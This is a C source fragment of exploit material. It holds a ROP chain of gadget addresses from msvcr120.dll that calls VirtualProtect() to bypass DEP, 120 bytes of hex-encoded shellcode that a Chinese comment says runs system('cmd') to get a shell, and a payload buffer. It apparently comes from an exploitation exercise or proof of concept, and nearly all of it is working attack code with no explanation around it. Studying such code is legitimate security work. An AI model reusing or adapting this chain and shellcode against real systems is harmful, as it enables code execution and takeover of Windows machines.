int rop_chain[] = {
	// [msvcr120.dll] base = 0x5a580000
	0x5a58ed02, // # pop ebp # ret [msvcr120.dll]
	0x5a58ed02, // # skip 4 bytes [msvcr120.dll]
	0x5a582308, // # pop ebx # ret [msvcr120.dll]
	0x00000201, // 0x00000201 -> ebx [msvcr120.dll]
	0x5a58e734, // # pop edx # ret [msvcr120.dll]
	0x00000040, // 0x00000040 -> edx [msvcr120.dll]
	0x5a58ec8c, // # pop ecx # ret [msvcr120.dll]
	0x5a65e000, // &writable location [msvcr120.dll]
	0x5a58f0f3, // # pop edi # ret [msvcr120.dll]
	0x5a58139b, // # ret [msvcr120.dll]
	0x5a58f74a, // # pop esi # ret [msvcr120.dll]
	0x5a58efd7, // # jmp eax [msvcr120.dll]
	0x5a58469c, // # pop eax # ret [msvcr120.dll]
	0x76b743ce, // entry of VirtualProtect() [kernel32.dll]
	0x5a5846a0, // # pushad(push eax, ecx, edx, ebx, original esp, ebp, esi, edi) # ret [msvcr120.dll]
	0x5a5bac78 // # push esp # ret [msvcr120.dll]
};

int rop_chain_len = sizeof(rop_chain);

/**
 * shellcode:
 * 调用msvcr120.dll中的system("cmd")获得shell
 */
char *shellcode =
	"\xe8\xff\xff\xff\xff\xc2\x59\x90\x33\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x58"
	"\x0c\x8b\xd3\x8b\xc3\x83\xc0\x30\x8b\x30\xbf\x41\x11\x24\x01\x81\xef\xdb\x10"
	"\x24\x01\x03\xf9\x53\x8a\x06\x8a\x1f\x3a\xc3\x74\x0f\x84\xc0\x75\x10\x80\xfb"
	"\x24\x75\x0b\x32\xc0\xfe\xc0\xeb\x07\x46\x46\x47\xeb\xe4\x32\xc0\x5b\x3c\x01"
	"\x74\x08\x8b\x1b\x3b\xda\x74\x15\xeb\xc0\x8b\x43\x18\x8b\xd8\x81\xeb\xc7\xde"
	"\xf9\xff\x2d\x3e\xf7\xf7\xff\x53\xff\xd0\xeb\xfe\x4d\x53\x56\x43\x52\x31\x32"
	"\x30\x2e\x64\x6c\x6c\x24"; // 120 bytes
int shellcode_len = 120;

char payload[512];
int payload_len = sizeof(payload);